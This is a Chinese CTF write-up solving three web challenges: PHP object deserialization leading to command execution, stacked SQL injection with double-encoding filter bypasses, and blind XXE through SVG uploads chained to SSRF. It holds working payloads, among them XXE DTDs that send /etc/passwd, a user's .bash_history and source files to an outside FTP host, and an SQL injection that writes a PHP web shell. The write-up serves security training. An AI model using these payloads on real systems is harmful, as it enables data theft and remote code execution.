## 白给的反序列化

### 题目描述

不能再简单了，再简单自杀，flag在flag.php里面

### 出题思路

最简单的反序列化，你会发现几乎所有的限制其实都不生效，只是为了增加一点阅读代码的乐趣

### 解题思路

根据提示只需要执行`cat flag.php`就行了

读完代码，你会发现，其实真正的限制只有这个

```php
if (in_array($this->method, array("mysys"))) {
            call_user_func_array(array($this, $this->method), $this->args);
        }
```

method变量为`mysys`就行

args变量的限制其实不生效，因为`__destruct()`，所以无论前面有没有`die()`最终`__destruct()`都会被调用，只要注意下`call_user_func_array`传入的第二个参数`$this->args`要是数组就行，可以任意命令执行。

exp：

```php
<?php
class home
{
    private $method;
    private $args;
    function __construct($method, $args)
    {
        $this->method = $method;
        $this->args = $args;
    }
    function __destruct()
    {
        if (in_array($this->method, array("mysys"))) {
            call_user_func_array(array($this, $this->method), $this->args);
        }
    }
}
$a = new home('mysys',array('flag.php'));
echo urlencode(serialize($a));
?>
```

生成如下payload

```
O%3A4%3A"home"%3A2%3A%7Bs%3A12%3A"%00home%00method"%3Bs%3A5%3A"mysys"%3Bs%3A10%3A"%00home%00args"%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A"flag.php"%3B%7D%7D
```

## sqli-labs 0

### 题目描述

不会吧，不会真有人不会注入吧

### 出题思路

网鼎杯“随便注”基础上加了转义，所以需要二次编码绕过，加入了过滤`rename、alter、union'`

### 解题思路

通过传入参数添加二次编码的单引号`%2527`,发现报错，但是因为过滤union用不了，所以想到堆叠注入。

```sql
1%2527;show databases;%2523  查库名
1%2527;use security;show tables;%2523 查表名
1%2527;use security;show columns from uziuzi;%2523 查列名
```

最后查看flag，`select`被过滤了，可以预处理语句或者handler查询

handler查询

```sql
1%2527;handler uziuzi open as hhh;handler hhh read first;%2523
```

预处理

```sql
id=1%2527;sEt%2520@sql=concat(%2522sel%2522,%2522ect%2520flag%2520from%2520%2560 uziuzi%2560%2522);prepare%2520mysql%2520from%2520@sql;execute%2520mysql;
```

## svgggggg！

### 题目描述

只求大佬门不要搅屎,求放过...

### 出题思路

解析svg未严格限制格式，造成blind xxe，ssrf打内网服务

### 解题方法

首先需要一台公网服务器，或者将本地服务转发到公网ip才能解题

先构造xxe.svg和xxe.xml

xxe.svg如下，重点在构造上半段，网上找blind xxe的payload也是可以的

```dtd
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://218.78.20.XXX:2122/xxe.xml">
%sp;
%param1;
]>

<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

xxe.xml如下

```dtd
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://218.78.20.xxx:2121/%data;'>">
```

我是用了github上的开源项目[xxeser](https://github.com/staaldraad/xxeserv)搭建在服务器上来比较便利的获取到Blind XXE返回的内容。接下来以xxeser为例，当然你也可以用自己的方法

将xxe.svg和xxe.xml移动到xxeser文件下自己创建的xxe-svg-xml文件夹下，并在我的服务器上开启了该服务

```
./xxeserv -w -wd ./xxe-svg-xml
```

只需要通过修改xxe.xml，再访问http://118.31.11.216:30500/view.php?svg=http://218.78.20.xxx:2122/xxe.svg，就可以获取到想要的内容，然后就可以开始Blind XXE之旅了

index.php和view.php都有`made with by r1ck`

读取r1ck的.bash_history

```dtd
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/home/r1ck/.bash_history">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://218.78.20.xxx:2121/%data;'>">
```

发现/app目录下起了php服务在0.0.0.0:8080

首先读取/app/index.php的源码，发现存在sql注入

```dtd
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/app/index.php">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://218.78.20.xxx:2121/%data;'>">
```

利用sql注入通过如下语句在/app目录下写入命令执行语句，这边写入shell语句注意编码url编码，hex编码都可以

url编码：

```dtd
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1:8080/index.php?id=-1%27%20union%20select%201,%27%3c?php%20system($%5fGET%5bcmd%5d)%3b?%3e%27%20into%20outfile%27/app/shell.php%27%23">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://218.78.20.xxx:2121/%data;'>">
```

hex编码：

```dtd
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1:8080/index.php?id=-1%27%20union%20select%201,0x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e%20into%20outfile%27/app/shell.php%27%23">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://218.78.20.xxx:2121/%data;'>">
```

通过刚刚写入的文件命令执行，`ls`查看当前目录下文件，可以看到flag文件，再用相同的方法`cat`查看flag文件就行

```dtd
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1:8080/shell.php?cmd=ls">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://218.78.20.xxx:2121/%data;'>">
```

